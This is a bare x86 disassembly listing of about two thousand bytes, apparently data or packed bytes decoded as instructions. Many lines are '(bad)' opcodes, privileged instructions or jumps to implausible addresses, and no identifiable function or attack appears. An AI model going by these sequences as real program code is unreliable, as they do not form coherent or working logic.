  43384f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  433855:	or     BYTE PTR [ebp+0x7],al
  433858:	mov    eax,ecx
  43385a:	clc    
  43385b:	jb     0x43381e
  43385d:	add    BYTE PTR [ebp+0x55],cl
  433860:	or     DWORD PTR [edi],0xc251d151
  433866:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  433870:	mov    edi,eax
  433872:	or     cl,al
  433874:	inc    ebp
  433875:	dec    ebp
  433876:	mov    eax,DWORD PTR [ecx+0x514d510c]
  43387c:	or     WORD PTR [ecx],0x8999
  433881:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433887:	mov    edx,DWORD PTR [ecx+0x8]
  43388a:	mov    eax,DWORD PTR [ebp-0x8]
  43388d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433894:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43389a:	inc    ebp
  43389b:	dec    eax
  43389c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  4338a2:	add    edx,DWORD PTR [ecx-0x8]
  4338a5:	mov    ecx,DWORD PTR [ecx]
  4338a7:	clc    
  4338a8:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  4338af:	mov    ecx,ebp
  4338b1:	clc    
  4338b2:	(bad)  
  4338b3:	popf   
  4338b4:	inc    DWORD PTR [eax]
  4338b6:	ret    0x8b
  4338b9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4338bf:	mov    edi,esp
  4338c1:	hlt    
  4338c2:	test   ecx,esi
  4338c4:	clc    
  4338c5:	or     BYTE PTR [ebp+0x7],al
  4338c8:	cmp    ecx,eax
  4338ca:	pushf  
  4338cb:	jb     0x433900
  4338cd:	add    BYTE PTR [eax-0x3f],al
  4338d0:	inc    eax
  4338d1:	daa    
  4338d2:	inc    ebp
  4338d3:	inc    ebp
  4338d4:	xor    eax,0x7f80803
  4338d9:	dec    ebp
  4338da:	cdq    
  4338db:	add    esi,DWORD PTR [edx]
  4338dd:	clc    
  4338de:	cmp    DWORD PTR [ecx],ecx
  4338e0:	or     al,0x8
  4338e2:	add    al,BYTE PTR [ebp+0x2c]
  4338e5:	xor    eax,0x7350845
  4338ea:	or     BYTE PTR [ebp+0x7],cl
  4338ed:	lea    ebx,[ecx-0x748dcdff]
  4338f3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4338fa:	mov    edx,DWORD PTR [eax]
  4338fc:	cld    
  4338fd:	dec    ebp
  4338fe:	push   ecx
  4338ff:	sub    edx,DWORD PTR [ecx-0x75]
  433902:	add    eax,0xf172fc
  433907:	or     BYTE PTR [ebp+0x7],cl
  43390a:	add    eax,ecx
  43390c:	or     al,0x72
  43390e:	add    DWORD PTR [eax],eax
  433910:	mov    ebx,0x29c2c1
  433915:	inc    ebp
  433916:	mov    eax,DWORD PTR [ebx]
  433918:	cmp    eax,0x3004d1c
  43391e:	xbegin 0x66c8c518
  433924:	clc    
  433925:	or     BYTE PTR [ebp+0x45],al
  433928:	cmp    DWORD PTR ds:0x78b089c,esi
  43392e:	adc    BYTE PTR [ebp+0x45],cl
  433931:	lea    eax,[ebp+0x33727501]
  433937:	add    cl,ch
  433939:	inc    ebp
  43393a:	add    bl,ch
  43393c:	add    BYTE PTR [ebx+0x45850845],cl
  433942:	je     0x4338cf
  433944:	push   ebx
  433945:	or     al,0x85
  433947:	dec    ebp
  433948:	std    
  433949:	mov    bh,bh
  43394b:	mov    BYTE PTR [ebp-0x75],al
  43394e:	mov    edi,eax
  433950:	or     al,0x89
  433952:	inc    ebp
  433953:	clc    
  433954:	mov    esp,esp
  433956:	hlt    
  433957:	call   DWORD PTR [edi-0x37]
  43395a:	push   ecx
  43395b:	or     al,0x51
  43395d:	push   ebp
  43395e:	xor    ebp,esp
  433960:	mov    esi,0x457251
  433965:	ss (bad) 
  433967:	pushf  
  433968:	inc    ebp
  433969:	(bad)  
  43396a:	mov    edi,eax
  43396c:	or     al,0x85
  43396e:	add    al,bh
  433970:	inc    eax
  433972:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  433976:	or     ah,bh
  433978:	inc    eax
  433979:	push   ecx
  43397a:	jmp    0x4339cd
  43397c:	mov    eax,DWORD PTR ds:0xe8720c
  433982:	mov    DWORD PTR [ebp-0x8],eax
  433985:	jne    0x4339cc
  433987:	jmp    0x433914
  433989:	mov    ebp,DWORD PTR [eax]
  43398b:	clc    
  43398c:	retf   0xff51
  43398f:	push   ecx
  433990:	mov    DWORD PTR ds:0x757210,eax
  433996:	mov    ecx,DWORD PTR [ebp-0x4]
  433999:	sub    esp,DWORD PTR [ebx-0x77]
  43399c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4339a3:	or     ah,bh
  4339a5:	pop    es
  4339a6:	ds cdq 
  4339a8:	push   DWORD PTR [edx]
  4339aa:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4339b0:	(bad)  
  4339b1:	mov    bh,bh
  4339b3:	jmp    0x4339a1
  4339b5:	leave  
  4339b6:	jne    0x4339c0
  4339b8:	call   0x303312
  4339bd:	in     al,dx
  4339be:	dec    ebp
  4339bf:	add    dh,BYTE PTR [ebx]
  4339c1:	add    BYTE PTR [ebx],al
  4339c3:	inc    ebp
  4339c4:	cmp    esi,DWORD PTR [esi]
  4339c6:	je     0x433964
  4339c8:	mov    eax,edi
  4339ca:	or     al,0xf0
  4339cc:	add    BYTE PTR [ebp+0x458bf845],al
  4339d2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4339d8:	adc    al,0x7
  4339da:	enter  0x9fc0,0xa5
  4339de:	rol    BYTE PTR [eax],0x5e
  4339e1:	mov    ecx,ecx
  4339e3:	or     al,0xc
  4339e5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4339ec:	jmp    0x4339ed
  4339ee:	push   ebp
  4339ef:	mov    esp,ebp
  4339f1:	cld    
  4339f2:	inc    ebp
  4339f3:	inc    ebp
  4339f4:	or     DWORD PTR [ecx+0x457dec10],0x0
  4339fb:	push   esi
  4339fc:	push   esi
  4339fd:	mov    edi,0x7af080f
  433a02:	add    bh,al
  433a04:	test   DWORD PTR [ecx+0x3a7320f],ebx
  433a0a:	add    BYTE PTR [ecx+0x4540100f],cl
  433a10:	mov    ebp,eax
  433a12:	mov    ebp,edi
  433a14:	lock call edx
  433a17:	fcom   DWORD PTR [ebp+0x45]
  433a1a:	mov    eax,0x148a8b
  433a1f:	push   ecx
  433a20:	enter  0xc145,0x83
  433a24:	cmp    cl,BYTE PTR [eax]
  433a26:	add    BYTE PTR [ebp+0x4d],al
  433a29:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  433a2f:	call   0xffa3359e
  433a34:	cmp    eax,DWORD PTR [ebp-0xc]
  433a37:	jmp    DWORD PTR [eax+edx*1-0x4e]
  433a3b:	push   ebp
  433a3c:	(bad)
  433a3f:	std    
  433a40:	lock push DWORD PTR [edi+0x5d08fcdb]
  433a47:	inc    ebp
  433a48:	(bad)  
  433a49:	call   0xff7d36d9
  433a4e:	add    al,BYTE PTR [ebp+0x37]
  433a51:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433a57:	jne    0x433a59
  433a59:	(bad)  
  433a5a:	cmp    edi,esp
  433a5c:	jne    0x433a8f
  433a5e:	mov    edi,edi
  433a60:	or     BYTE PTR [ebx-0x307f0b49],cl
  433a66:	pop    ds
  433a67:	into   
  433a68:	je     0x433a2b
  433a6a:	mov    ebx,DWORD PTR [esi]
  433a6c:	or     BYTE PTR [ebp-0x49],al
  433a6f:	mov    esp,DWORD PTR [esi-0x77]
  433a72:	mov    esi,0xfe451f0c
  433a77:	mov    eax,DWORD PTR [eax]
  433a79:	or     al,0x66
  433a7b:	sar    bl,0x3b
  433a7e:	xor    esi,DWORD PTR [ebp+0x66]
  433a81:	xor    ecx,edi
  433a83:	pop    edi
  433a84:	adc    bl,BYTE PTR [ebx+0x7e]
  433a87:	ret    0xff
  433a8a:	cld    
  433a8b:	inc    ebp
  433a8c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433a92:	cld    
  433a93:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  433a9a:	push   0xffffff83
  433a9c:	pop    edi
  433a9d:	or     BYTE PTR [ebp+0x53],dh
  433aa0:	xorps  xmm1,xmm2
  433aa3:	test   BYTE PTR [eax+eax*1],bh
  433aa6:	add    BYTE PTR [eax],al
  433aa8:	adc    eax,eax
  433aaa:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  433ab2:	jmp    DWORD PTR [eax]
  433ab4:	ror    al,0x5e
  433ab7:	inc    ebp
  433ab8:	leave  
  433ab9:	xor    ecx,DWORD PTR [eax]
  433abb:	and    DWORD PTR [ebx-0x3ec70708],ecx
  433ac1:	add    ch,al
  433ac3:	xor    edi,edi
  433ac5:	xor    DWORD PTR [ebx],0x660033fe
  433acb:	mov    DWORD PTR [ebp-0xc],ecx
  433ace:	pcmpgtw mm0,mm0
  433ad1:	add    dl,ah
  433ad3:	leave  
  433ad4:	mov    edi,DWORD PTR [eax-0x7d]
  433ad7:	push   ax
  433ad9:	dec    ebp
  433ada:	mov    esi,DWORD PTR [ebx-0x75]
  433add:	lea    ebp,[eax-0x7c00fffe]
  433ae3:	xor    eax,DWORD PTR [eax]
  433ae5:	sysret 
  433ae7:	dec    ebp
  433ae8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  433aef:	push   WORD PTR [ecx+0x8]
  433af3:	jne    0x433ab6
  433af5:	ud0    ecx,DWORD PTR [ecx]
  433af8:	mov    edi,DWORD PTR [edx]
  433afa:	lods   al,BYTE PTR ds:[esi]
  433afb:	add    BYTE PTR [eax],al
  433afd:	data16 (bad) 
  433aff:	iret   
  433b00:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433b07:	cli    
  433b08:	inc    ebp
  433b09:	cmp    al,0x8d
  433b0b:	add    BYTE PTR [esi+0x2d],ah
  433b0e:	inc    ebp
  433b0f:	pop    ebp
  433b10:	lea    ecx,[edi]
  433b12:	mov    dl,bh
  433b14:	add    BYTE PTR [edi],cl
  433b16:	mov    DWORD PTR [eax+eax*8],edi
  433b19:	mov    ebx,0x3a87
  433b1e:	add    BYTE PTR [ebx],ch
  433b20:	inc    ebp
  433b21:	data16 (bad) 
  433b23:	clc    
  433b24:	int3   
  433b25:	cmp    eax,DWORD PTR [eax]
  433b27:	je     0x433ab2
  433b29:	push   0xffffffc8
  433b2b:	pop    edi
  433b2c:	xchg   DWORD PTR [ebp+0x0],eax
  433b2f:	data16 add BYTE PTR [ebp+0x45],cl
  433b33:	lea    cx,[ebp+0x10]
  433b37:	jb     0x433b39
  433b39:	jmp    0x433ac4
  433b3b:	call   eax
  433b3d:	clc    
  433b3e:	xchg   DWORD PTR [edi+0x1],edi
  433b41:	mov    eax,DWORD PTR [eax]
  433b43:	or     BYTE PTR [ebp-0x49],al
  433b46:	lea    eax,[eax+0x74003154]
  433b4c:	push   edi
  433b4d:	inc    edx
  433b4e:	jge    0x433b4f
  433b50:	mov    DWORD PTR [edi],ecx
  433b52:	fdiv   DWORD PTR [edi-0x6]
  433b55:	inc    DWORD PTR [eax]
  433b57:	xor    edx,DWORD PTR [eax+0x5f]
  433b5a:	xchg   DWORD PTR [ebx+0x1],ebx
  433b5d:	ret    0x0
  433b60:	xor    BYTE PTR [ebp-0x51],cl
  433b63:	cmp    edi,0xf0ff8902
  433b69:	data16 ror al,0x84
  433b6d:	rol    BYTE PTR [eax],0x3b
  433b70:	add    al,dh
  433b72:	dec    eax
  433b73:	xchg   esp,eax
  433b74:	push   ebx
  433b75:	jmp    0x433b02
  433b77:	push   ebp
  433b78:	add    esp,ebp
  433b7a:	add    ebp,esp
  433b7c:	mov    edx,DWORD PTR [edi+0x24]
  433b7f:	clc    
  433b80:	dec    esi
  433b81:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433b87:	cmp    BYTE PTR [ebx],al
  433b89:	jne    0x433b14
  433b8b:	xor    esp,eax
  433b8d:	jmp    0x463d10
  433b92:	add    ebp,DWORD PTR [ecx+ecx*4]
  433b95:	jne    0x433b8b
  433b97:	call   0xffcd38f1
  433b9c:	clc    
  433b9d:	xchg   edi,eax
  433b9e:	sti    
  433b9f:	add    DWORD PTR [ebx],eax
  433ba1:	add    BYTE PTR [ebp+0x47],bl
  433ba4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433baa:	pop    ebp
  433bab:	mov    DWORD PTR [esi-0x48],esi
  433bae:	jmp    0x433bf7
  433bb0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433bb6:	(bad)  
  433bb8:	cmp    al,0x0
  433bba:	cmp    eax,DWORD PTR [ebp+0x18]
  433bbd:	lea    ebx,[ebp-0x56]
  433bc0:	jle    0x433bc2
  433bc2:	jae    0x433b4d
  433bc4:	mov    eax,esp
  433bc6:	call   0xb900:0x8b005587
  433bcd:	inc    ebp
  433bce:	push   ebp
  433bcf:	lea    ecx,[ebp-0x27ff4f12]
  433bd5:	mov    eax,edi
  433bd7:	int3   
  433bd8:	push   ebp
  433bd9:	xchg   edi,eax
  433bdb:	add    esp,ebp
  433bdd:	add    BYTE PTR [eax],al
  433bdf:	inc    ebp
  433be0:	add    BYTE PTR [ebp+0x8b3255],cl
  433be6:	cld    
  433be7:	mov    DWORD PTR [edx],edi
  433be9:	aam    0x75
  433beb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433bf1:	mov    DWORD PTR [ebx-0x50],edx
  433bf4:	test   BYTE PTR [ebp-0x1],0xe8
  433bf8:	mov    eax,DWORD PTR [eax]
  433bfa:	hlt    
  433bfb:	add    al,al
  433bfd:	mov    eax,DWORD PTR ds:0x890045a8
  433c03:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433c09:	inc    DWORD PTR [eax*2+0xf75854d]
  433c10:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433c16:	call   0x72999957
  433c1b:	je     0x433c7b
  433c1d:	js     0x433c7e
  433c1f:	lock ret 0x7e
  433c23:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433c29:	mov    edi,edi
  433c2b:	sbb    al,bl
  433c2d:	clc    
  433c2e:	add    BYTE PTR [ebp-0x73],bh
  433c31:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433c37:	ror    BYTE PTR [eax],1
  433c39:	dec    ebp
  433c3a:	xchg   ebp,eax
  433c3b:	mov    edi,edi
  433c3d:	in     al,0x8b
  433c3f:	jge    0x433bca
  433c41:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433c47:	clc    
  433c48:	pop    esi
  433c49:	fist   DWORD PTR [ebp+0x5d398b5d]
  433c4f:	clc    
  433c50:	add    al,0x6e
  433c52:	mov    eax,DWORD PTR [ebx]
  433c54:	mov    BYTE PTR [ebp+0x0],dl
  433c57:	mov    edx,DWORD PTR [ebx-0x20]
  433c5a:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433c60:	add    eax,0x3b3a73
  433c65:	adc    al,0x89
  433c67:	pop    eax
  433c68:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433c6c:	ret    0xf08
  433c6f:	cmp    al,0x2
  433c71:	mov    DWORD PTR [edx],edi
  433c73:	cld    
  433c74:	add    BYTE PTR [ebp+0x66],dl
  433c77:	add    eax,ebx
  433c79:	add    esp,eax
  433c7b:	sub    eax,eax
  433c7d:	or     BYTE PTR [ecx-0x77f474bb],cl
  433c83:	add    BYTE PTR [eax],al
  433c85:	mov    DWORD PTR [ebx-0x24],ebx
  433c88:	push   edi
  433c89:	push   ebp
  433c8a:	clc    
  433c8b:	add    DWORD PTR [esi+0x1b0100],0x45
  433c92:	out    0xff,eax
  433c94:	add    edx,DWORD PTR [eax]
  433c96:	jmp    0x433c80
  433c98:	cmp    ch,0x44
  433c9b:	(bad)  
  433c9c:	jmp    0x40c8c4ee
  433ca1:	je     0x433c2d
  433ca3:	mov    eax,DWORD PTR [eax-0x10c78104]
  433ca9:	inc    ebp
  433caa:	add    BYTE PTR [ebx-0x770375],al
  433cb0:	add    ah,ch
  433cb2:	add    edx,esp
  433cb4:	pop    edi
  433cb5:	pop    ebp
  433cb6:	push   ebp
  433cb7:	inc    ebx
  433cb8:	in     al,dx
  433cb9:	pop    ebp
  433cba:	in     al,dx
  433cbb:	cmp    edx,DWORD PTR [edi-0x8]
  433cbe:	ss xchg esp,eax
  433cc0:	pushf  
  433cc1:	pop    ebx
  433cc2:	mov    ecx,ecx
  433cc4:	call   0x899883cd
  433cc9:	in     al,dx
  433cca:	in     al,0x45
  433ccc:	dec    ebp
  433ccd:	push   esi
  433cce:	test   DWORD PTR [eax+0xfb010f],esi
  433cd4:	add    BYTE PTR [eax+0xc018b],dh
  433cda:	leave  
  433cdb:	inc    ebp
  433cdc:	test   al,ch
  433cde:	add    dh,bh
  433ce0:	add    bh,bh
  433ce2:	dec    ebp
  433ce3:	push   cs
  433ce4:	mov    DWORD PTR [ecx],eax
  433ce6:	hlt    
  433ce7:	push   es
  433ce8:	dec    ebp
  433ce9:	leave  
  433cea:	mov    DWORD PTR [eax],ecx
  433cec:	clc    
  433ced:	cmovge eax,ecx
  433cf0:	mov    ecx,0x85c2f0
  433cf6:	clc    
  433cf7:	pop    DWORD PTR [ebp+0x1]
  433cfa:	push   ebx
  433cfb:	add    BYTE PTR [ebp-0x15],bh
  433cfe:	push   esi
  433cff:	xor    eax,0x898a45
  433d04:	cld    
  433d05:	inc    BYTE PTR [ebp+0x0]
  433d08:	cmp    BYTE PTR [esi-0x64],ah
  433d0b:	add    DWORD PTR [esi+0x78308c1],edi
  433d11:	add    ah,BYTE PTR [edi-0x49]
  433d14:	int    0xbb
  433d16:	mov    ecx,DWORD PTR [edi+0xc]
  433d19:	add    dh,al
  433d1b:	cmp    ecx,ebx
  433d1d:	jne    0x433ce7
  433d1f:	xor    ecx,DWORD PTR [ebp+0x66]
  433d22:	jmp    0xca3d28
  433d27:	add    DWORD PTR [ebp+0x0],eax
  433d2a:	mov    eax,ebx
  433d2c:	or     al,0x8b
  433d2e:	(bad)  
  433d2f:	mov    ecx,esi
  433d31:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433d38:	mov    eax,edi
  433d3a:	or     BYTE PTR [edx],cl
  433d3c:	shl    cl,cl
  433d3e:	icebp  
  433d3f:	add    BYTE PTR [ebp+0x3a],0x8b
  433d43:	or     BYTE PTR [edx+eax*2],cl
  433d46:	(bad)  
  433d47:	or     cl,dh
  433d49:	stc    
  433d4a:	shl    DWORD PTR [ebp-0x30],0xc6
  433d4e:	xor    al,0x0
  433d50:	inc    ebp
  433d51:	xchg   BYTE PTR [ebx],al
  433d53:	add    esp,edi
  433d55:	add    BYTE PTR [ebp-0x39],cl
  433d58:	mov    al,bl
  433d5a:	test   DWORD PTR [ebx+0x1c348375],ecx
  433d60:	sub    al,0xbf
  433d62:	jmp    0x433ce9
  433d64:	mov    edi,eax
  433d66:	lock jge 0x433d5a
  433d69:	lea    esi,[edx-0x74bad5fd]
  433d6f:	mov    ebp,esp
  433d71:	or     cl,dh
  433d73:	leave  
  433d74:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433d7b:	dec    ebp
  433d7c:	dec    ebp
  433d7d:	test   DWORD PTR [ebx],eax
  433d7f:	paddb  mm6,mm0
  433d82:	add    DWORD PTR [eax],eax
  433d84:	dec    ebp
  433d85:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433d8b:	mov    esi,DWORD PTR [edx]
  433d8d:	or     al,0x2b
  433d8f:	dec    ebp
  433d90:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433d96:	mov    esp,edx
  433d98:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433d9f:	mov    DWORD PTR [ebx],ebp
  433da1:	call   0xc76c6d1
  433da6:	mov    DWORD PTR [ebp+0x10],ecx
  433da9:	(bad)  
  433daa:	push   0x8b85ff10
  433daf:	clc    
  433db0:	or     al,0x51
  433db2:	(bad)  
  433db3:	push   ecx
  433db4:	retf   
  433db5:	mov    ebx,0xff4d8dc8
  433dba:	mov    DWORD PTR [ebp+0x8],eax
  433dbd:	xor    eax,DWORD PTR [ebp-0x75]
  433dc0:	cmp    ebp,DWORD PTR [ebx]
  433dc2:	lsl    ebx,WORD PTR [edi-0x8]
  433dc6:	call   DWORD PTR [ebx-0x741bff75]
  433dcc:	(bad)  
  433dcd:	or     al,0x5b
  433dcf:	dec    ebp
  433dd0:	or     BYTE PTR [ebx],dh
  433dd2:	inc    ebp
  433dd3:	xor    esi,DWORD PTR ds:0x708088d
  433dd9:	in     eax,0x99
  433ddb:	add    BYTE PTR [edx],dh
  433ddd:	inc    ebp
  433dde:	pop    edi
  433ddf:	xor    eax,edx
  433de1:	test   DWORD PTR [eax],0x81108b8b
  433de7:	dec    ebp
  433de8:	sub    al,0x33
  433dea:	add    BYTE PTR [ebx],dh
  433dec:	push   esi
  433ded:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433df3:	mov    edi,eax
  433df5:	or     BYTE PTR [ebp+0x45],al
  433df8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433dfe:	ss leave 
  433e00:	pushf  
  433e01:	push   es
  433e02:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433e0a:	inc    ebp
  433e0b:	cmp    BYTE PTR [esi],0x51
  433e0e:	pushf  
  433e0f:	addr16 (bad) 
  433e11:	shl    esp,1
  433e13:	dec    ebp
  433e14:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433e1a:	(bad)  
  433e1b:	jmp    0x8c0b10f7
  433e20:	aam    0x8
  433e22:	test   DWORD PTR [ebp-0x8],ecx
  433e25:	mov    BYTE PTR [ebp-0x75],al
  433e28:	or     BYTE PTR [eax],cl
  433e2a:	add    BYTE PTR [ebp-0x75],dl
  433e2d:	mov    eax,0xfc728b
  433e32:	dec    ebp
  433e33:	enter  0xceba,0x8
  433e37:	retf   0x1807
  433e3a:	ret    0x994d
  433e3d:	mov    esi,DWORD PTR [edx]
  433e3f:	or     al,0x33
  433e41:	into   
  433e42:	add    edx,esi
  433e44:	add    ecx,edx
  433e46:	bswap  eax
  433e48:	ror    esi,0x98
  433e4b:	dec    ebp
  433e4c:	add    cl,ch
  433e4e:	mov    edi,edi
  433e50:	hlt    
  433e51:	inc    esi
  433e53:	inc    ebp
  433e54:	ret    0x4533
  433e57:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433e5d:	or     BYTE PTR [ebx],dh
  433e5f:	dec    ebp
  433e60:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433e66:	jne    0xff8d3e2d
  433e6c:	inc    ebp
  433e6d:	inc    ebp
  433e6e:	mov    esi,DWORD PTR [ebx]
  433e70:	clc    
  433e71:	pop    esi
  433e72:	ret    0xcaeb
  433e75:	mov    eax,esi
  433e77:	call   0x5204904a
  433e7c:	dec    ebp
  433e7d:	add    eax,0xf8728b
  433e82:	adc    eax,0xce0ccac9
  433e87:	push   ebp
  433e88:	ret    0xc6ec
  433e8b:	in     al,dx
  433e8c:	call   0x33438b95
  433e91:	push   edi
  433e92:	add    edi,eax
  433e94:	xor    eax,eax
  433e96:	jmp    0x433edd
  433e98:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433e9e:	add    eax,edi
  433ea0:	shr    eax,cl
  433ea2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433ea8:	mov    edi,DWORD PTR [ecx]
  433eaa:	in     al,dx
  433eab:	pushf  
  433eac:	ret    0x84c7
  433eaf:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433eb5:	inc    ebp
  433eb6:	in     al,dx
  433eb7:	ss inc ebp
  433eb9:	pushf  
  433eba:	mov    eax,edi
  433ebc:	cld    
  433ebd:	fmul   st(2),st
  433ebf:	sbb    dl,al
  433ec1:	jmp    0x9c3b:0x374d45c1
  433ec8:	jbe    0x433e91
  433eca:	mov    esp,eax
  433ecc:	clc    
  433ecd:	add    BYTE PTR [ebp+0x0],cl
  433ed0:	mov    ecx,ecx
  433ed2:	lea    eax,[ebp-0x5]
  433ed5:	mov    edi,edi
  433ed7:	call   0x51ce9021
  433edc:	hlt    
  433edd:	xor    eax,edx
  433edf:	mov    esi,0x997284
  433ee4:	xor    cl,dl
  433ee6:	mov    esi,eax
  433ee8:	hlt    
  433ee9:	into   
  433eea:	inc    ebp
  433eeb:	scas   eax,DWORD PTR es:[edi]
  433eec:	mov    ebp,ecx
  433eee:	cld    
  433eef:	add    dl,cl
  433ef1:	add    dl,al
  433ef3:	inc    ebp
  433ef4:	shr    DWORD PTR [ebx],0x4d
  433ef7:	xor    edi,DWORD PTR [ebx]
  433ef9:	mov    DWORD PTR [edi],ecx
  433efb:	clc    
  433efc:	dec    esi
  433efd:	inc    ebp
  433efe:	dec    DWORD PTR [ebx-0x3d2b1775]
  433f04:	ret    0xc6ca
  433f07:	mov    BYTE PTR [ebp-0x32],0x53
  433f0b:	scas   eax,DWORD PTR es:[edi]
  433f0c:	inc    ebp
  433f0d:	jmp    0x433f46
  433f0f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433f16:	pop    ebx
  433f17:	xor    ecx,DWORD PTR [ebp+0x3]
  433f1a:	mov    eax,DWORD PTR [ebx]
  433f1c:	clc    
  433f1d:	test   edx,ecx
  433f1f:	mov    ecx,esi
  433f21:	cld    
  433f22:	call   0x8ab7846c
  433f27:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433f2d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433f33:	fdiv   QWORD PTR [ebx]
  433f35:	retf   0xce89
  433f38:	in     al,0xc1
  433f3a:	inc    ebp
  433f3b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433f41:	into   
  433f42:	mov    dh,0xc1
  433f45:	call   0x8c1784ce
  433f4a:	(bad)  
  433f4b:	cld    
  433f4c:	mov    ecx,DWORD PTR [ebp-0x14]
  433f4f:	xor    eax,ecx
  433f51:	lea    eax,[ebp+0x8]
  433f54:	mov    esi,DWORD PTR [edx-0x4]
  433f57:	add    dl,al
  433f59:	inc    ebp
  433f5a:	mov    esp,0x32d8998b
  433f5f:	dec    ebp
  433f60:	mov    esi,DWORD PTR [ebx]
  433f62:	cld    
  433f63:	xor    eax,edx
  433f65:	sub    esp,DWORD PTR [edi-0x75]
  433f68:	int    0xec
  433f6a:	sub    ecx,eax
  433f6c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433f72:	mov    esi,esp
  433f74:	call   0x34178cfd
  433f79:	inc    DWORD PTR [ebx]
  433f7b:	mov    edi,DWORD PTR [ebx]
  433f7d:	cld    
  433f7e:	jne    0x433fcd
  433f80:	mov    esi,DWORD PTR [ebx]
  433f82:	aam    0x8d
  433f84:	dec    ebp
  433f85:	or     BYTE PTR [ebx],dh
  433f87:	jb     0x433f8c
  433f89:	add    BYTE PTR [edi+0x45],bl
  433f8c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433f93:	xor    ebp,esp
  433f95:	xor    eax,edi
  433f97:	sub    edi,esp
  433f99:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433f9f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433fa6:	inc    ebp
  433fa7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433fad:	clc    
  433fae:	mov    eax,edi
  433fb0:	nop
  433fb1:	fadd   QWORD PTR [eax]
  433fb3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433fb9:	jmp    0x433f44
  433fbb:	mov    eax,DWORD PTR [ecx]
  433fbd:	fadd   DWORD PTR [eax]
  433fbf:	inc    ebp
  433fc0:	or     DWORD PTR [ebx],esi
  433fc2:	dec    eax
  433fc3:	add    edx,DWORD PTR [ebx-0x2d]
  433fc6:	dec    ebp
  433fc7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433fcd:	inc    ebp
  433fce:	push   ecx
  433fcf:	mov    dl,BYTE PTR [ecx-0xd]
  433fd2:	xor    ecx,DWORD PTR [ebp-0x45]
  433fd5:	(bad)  
  433fd7:	rol    BYTE PTR [eax],0xc1
  433fda:	ret    
  433fdb:	inc    ebp
  433fdc:	inc    ebp
  433fdd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433fe3:	xor    eax,ebx
  433fe5:	add    eax,DWORD PTR [ebp+0x23]
  433fe8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433fee:	cmp    edi,0xc
  433ff1:	dec    ebp
  433ff2:	inc    ebp
  433ff3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433ff9:	inc    ebp
  433ffa:	mov    esi,DWORD PTR [ebx]
  433ffc:	clc    
  433ffd:	lea    eax,[ebp+0x45725407]
  434003:	add    BYTE PTR [ebp+eax*2-0x75],dh
  434007:	xor    edi,DWORD PTR [eax]
  434009:	mov    ecx,0xff8b8d4d
  43400e:	push   esp
  43400f:	enter  0x4df7,0x23
  434013:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  434019:	mov    eax,DWORD PTR [ebx]
  43401b:	loopne 0x434008
  43401d:	ret    0xc68b
  434020:	push   esp
  434021:	enter  0x9745,0x8b
  434025:	inc    ebp
  434026:	cld    
  434027:	mov    eax,edi
  434029:	clc    
  43402a:	ret    
  43402b:	ret    0xc645
  43402e:	mov    esi,DWORD PTR [ebx]
  434030:	cld    
  434031:	pop    esi
  434032:	mov    ebx,0x83458bc3
  434038:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43403c:	dec    ebp
  43403d:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  434045:	clc    
